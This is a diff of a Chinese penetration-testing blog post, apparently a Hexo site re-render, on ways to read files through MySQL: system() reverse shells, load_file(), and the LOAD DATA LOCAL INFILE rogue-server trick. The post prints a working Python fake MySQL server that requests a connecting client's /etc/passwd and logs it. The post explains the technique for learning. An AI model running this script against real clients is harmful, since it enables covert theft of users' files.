@@ -6,10 +6,10 @@
 
 
 <html class="theme-next mist use-motion" lang="zh-Hans">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 
@@ -20,8 +20,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="渗透测试,">
+  <meta name="keywords" content="渗透测试," />
 
 
 
@@ -79,36 +79,37 @@
 
 
 
-<meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
 <meta property="og:title" content="关于mysql几种读取文件及利用的方式">
-<meta property="og:url" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/index.html">
+<meta property="og:url" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/3.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/5.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/6.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/7.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/8.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/9.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/10.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/12.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/11.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/13.png">
-<meta property="og:updated_time" content="2019-10-02T04:08:03.817Z">
+<meta property="og:locale">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/1.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/2.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/3.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/4.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/5.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/6.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/7.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/8.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/9.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/10.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/12.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/11.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/13.png">
+<meta property="article:published_time" content="2019-10-01T03:32:13.000Z">
+<meta property="article:modified_time" content="2019-10-02T04:08:03.817Z">
+<meta property="article:author" content="lockcy">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="关于mysql几种读取文件及利用的方式">
-<meta name="twitter:image" content="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/1.png">
+<meta name="twitter:image" content="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/1.png">
 
 
 
 <script type="text/javascript" id="hexo.configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
-    root: '/',
+    root: '',
     scheme: 'Mist',
     version: '5.1.4',
     sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
@@ -131,7 +132,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/">
+  <link rel="canonical" href="https://lockcy.github.io/2019/10/01/关于mysql读取文件的几种利用方式/"/>
 
 
 
@@ -147,7 +148,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
@@ -165,7 +166,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">lockcy's cave</span>
         <span class="logo-line-after"><i></i></span>
@@ -195,7 +196,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
           </a>
@@ -205,7 +206,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
             关于
           </a>
@@ -215,7 +216,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
             标签
           </a>
@@ -225,7 +226,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             归档
           </a>
@@ -264,11 +265,11 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/01/关于mysql读取文件的几种利用方式/">
+    <link itemprop="mainEntityOfPage" href="https://lockcy.github.io/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lockcy">
-      <meta itemprop="description" content>
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/harutya.jpg">
     </span>
 
@@ -325,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  620
+                  634
                 </span>
               
 
@@ -363,32 +364,31 @@
 
       
         <hr>
-<a id="more"></a>
+<span id="more"></span>
 
 <p>1.system</p>
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/1.png">
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/1.png" class="">
 
 <p>可以反弹shell</p>
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/2.png">
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/3.png">
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/2.png" class="">
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/3.png" class="">
 
 <p>可以通过堆叠查询使用，比较适合phpmyadmin，如果直接在有漏洞的页面注入会产生不可预料的错误（以php为例，一般会使用mysqli_fetch_array取查询出的条目，需要符合条件的条目）</p>
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/4.png">
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/4.png" class="">
 
 <p>windows下system似乎没有作用</p>
 <p>2.load_file()<br> 使用load_file()是要有条件的<br> 1.在mysql下读写文件secure_file_priv的值不为NULL，这在mysql突破secure_file_priv写shell文章里有写<br> 2.需要拥有所需文件的权限</p>
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/5.png">
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/5.png" class="">
 <p>然而在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL，即默认无法写入写出，需要修改secure_file_priv</p>
 <p>3.load data infile</p>
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/6.png">
-<p>关于load data infile，存在一个伪造服务端任意读取客户端文件的问题，这里参考了很多网上大牛的资料，还原一下这个漏洞。<br>远程连接Mysql的过程具体如下：<br> 1.客户端发起tcp连接，服务器返回一个greeting，包含了服务器mysql版本等信息<br> <img src="/2019/10/01/关于mysql读取文件的几种利用方式/7.png"><br> 2.login request<br> <img src="/2019/10/01/关于mysql读取文件的几种利用方式/8.png"><br> 3.初始化查询<br> <img src="/2019/10/01/关于mysql读取文件的几种利用方式/9.png"><br> 4.要进行load data local infile,这里有个坑，即使set global local_infile = ‘ON’ 后还是报错，所以只能登录时加–enable-local-infile参数，插入成功<br>  <img src="/2019/10/01/关于mysql读取文件的几种利用方式/10.png"><br> 5.服务端返回一个TABULAR请求，请求客户端的/etc/passwd 文件<br> <img src="/2019/10/01/关于mysql读取文件的几种利用方式/12.png"><br> 6./etc/passwd 中的内容成功传到了服务端<br> <img src="/2019/10/01/关于mysql读取文件的几种利用方式/11.png"></p>
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/6.png" class="">
+<p>关于load data infile，存在一个伪造服务端任意读取客户端文件的问题，这里参考了很多网上大牛的资料，还原一下这个漏洞。<br>远程连接Mysql的过程具体如下：<br> 1.客户端发起tcp连接，服务器返回一个greeting，包含了服务器mysql版本等信息<br> <img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/7.png" class=""><br> 2.login request<br> <img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/8.png" class=""><br> 3.初始化查询<br> <img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/9.png" class=""><br> 4.要进行load data local infile,这里有个坑，即使set global local_infile = ‘ON’ 后还是报错，所以只能登录时加–enable-local-infile参数，插入成功<br>  <img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/10.png" class=""><br> 5.服务端返回一个TABULAR请求，请求客户端的/etc/passwd 文件<br> <img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/12.png" class=""><br> 6./etc/passwd 中的内容成功传到了服务端<br> <img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/11.png" class=""></p>
 <p> 这里可以伪造一个服务端，当客户端连接完成时发送一个TABULAR请求来任意读取客户端中有权限的文件信息<br> 服务端的伪造脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#https://www.cnblogs.com/apossin/p/10127496.html</span><br><span class="line">#coding=utf-8</span><br><span class="line">import socket</span><br><span class="line">import logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=&quot;/etc/passwd&quot;</span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((&quot;&quot;,3306))</span><br><span class="line">sv.listen(5)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(&apos;Conn from: %r&apos;, address)</span><br><span class="line">conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)   #greeting包</span><br><span class="line">conn.recv(9999)</span><br><span class="line">logging.info(&quot;auth okay&quot;)</span><br><span class="line">conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)   #reponse ok包</span><br><span class="line">conn.recv(9999)</span><br><span class="line">logging.info(&quot;want file...&quot;)</span><br><span class="line">wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename   #长度+数据包序号（1）+读取文件名</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(9999)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#https:&#x2F;&#x2F;www.cnblogs.com&#x2F;apossin&#x2F;p&#x2F;10127496.html</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import socket</span><br><span class="line">import logging</span><br><span class="line">logging.basicConfig(level&#x3D;logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">sv&#x3D;socket.socket()</span><br><span class="line">sv.bind((&quot;&quot;,3306))</span><br><span class="line">sv.listen(5)</span><br><span class="line">conn,address&#x3D;sv.accept()</span><br><span class="line">logging.info(&#39;Conn from: %r&#39;, address)</span><br><span class="line">conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)   #greeting包</span><br><span class="line">conn.recv(9999)</span><br><span class="line">logging.info(&quot;auth okay&quot;)</span><br><span class="line">conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)   #reponse ok包</span><br><span class="line">conn.recv(9999)</span><br><span class="line">logging.info(&quot;want file...&quot;)</span><br><span class="line">wantfile&#x3D;chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename   #长度+数据包序号（1）+读取文件名</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content&#x3D;conn.recv(9999)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
 <p>读取成功</p>
-<img src="/2019/10/01/关于mysql读取文件的几种利用方式/13.png">
+<img src="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/13.png" class="">
 
-<p>参考资料：<br><a href="https://github.com/allyshka/Rogue-MySql-Server/blob/master" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server/blob/master</a><br><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">https://lightless.me/archives/read-mysql-client-file.html</a><br><a href="https://www.cnblogs.com/apossin/p/10127496.html" target="_blank" rel="noopener">https://www.cnblogs.com/apossin/p/10127496.html</a></p>
+<p>参考资料：<br><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server/blob/master">https://github.com/allyshka/Rogue-MySql-Server/blob/master</a><br><a target="_blank" rel="noopener" href="https://lightless.me/archives/read-mysql-client-file.html">https://lightless.me/archives/read-mysql-client-file.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/apossin/p/10127496.html">https://www.cnblogs.com/apossin/p/10127496.html</a></p>
 
       
     </div>
@@ -412,7 +412,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
           
         </div>
       
@@ -425,7 +425,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/28/mysql突破secure-file-priv写shell/" rel="next" title="mysql突破secure_file_priv写shell">
+              <a href="/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/" rel="next" title="mysql突破secure_file_priv写shell">
                 <i class="fa fa-chevron-left"></i> mysql突破secure_file_priv写shell
               </a>
             
@@ -435,7 +435,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/10/06/buuctf-pwn做题记录/" rel="prev" title="buuctf pwn做题记录(ing)">
+              <a href="/2019/10/06/buuctf-pwn%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="buuctf pwn做题记录(ing)">
                 buuctf pwn做题记录(ing) <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -485,9 +485,12 @@
   <aside id="sidebar" class="sidebar">
     
     <div class="sidebar-inner">
-		<div id="music163player">
-			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=2196816455&auto=1&height=430"></iframe>
-		</div>
+
+
+		<!--<div id="music163player">
+			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2196816455&auto=1&height=430"></iframe>
+		</div>-->
+
       
 
       
@@ -496,10 +499,12 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/harutya.jpg" alt="lockcy">
+              <img class="site-author-image" itemprop="image"
+                src="/images/harutya.jpg"
+                alt="" />
             
-              <p class="site-author-name" itemprop="name">lockcy</p>
-              <p class="site-description motion-element" itemprop="description">A mind at peace with all below, a heart whose love is innocent!</p>
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
           <nav class="site-state motion-element">
@@ -507,9 +512,9 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -550,12 +555,18 @@
             </div>
           
 
+          <link rel="stylesheet" href="/dist/APlayer.min.css">
+          <div id="aplayer"></div>
+          <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+          <script type="text/javascript" src="/dist/music.js"></script>
+      
           
           
 
 
           
           
+
 
           
 
@@ -597,7 +608,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">33.8k</span>
+    <span title="Site words total count">35.6k</span>
   
 </div>
 
@@ -618,7 +629,7 @@
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
 <span class="post-meta-divider">|</span>
-<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv" < span>人</span>
+<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"</span>人</span>
 
 
 
@@ -631,7 +642,7 @@
 
 
         
-      </span></div>
+      </div>
     </footer>
 
     
@@ -786,5 +797,6 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</body>
 </html>
+<script src="/live2d-widget/autoload.js"></script>
